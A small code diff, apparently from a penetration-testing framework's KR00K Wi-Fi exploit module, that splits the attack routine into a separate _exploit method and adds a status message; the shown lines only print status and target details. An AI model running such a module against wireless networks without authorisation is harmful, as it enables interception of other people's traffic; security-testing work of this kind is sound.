@@ -293,6 +293,11 @@ class Exploit(Exploit):
             print_error("Root privileges required for monitor mode and injection.")
             return
 
+        print_success("Pre-conditions satisfied; launching exploit")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: KR00K zeroed-key decryption via deauth + CCMP sniff."""
         print_status(f"Starting KR00K attack on channel {self.channel}...")
         print_info(f"BSSID: {self.target_bssid}  Client: {self.target_client}")
 
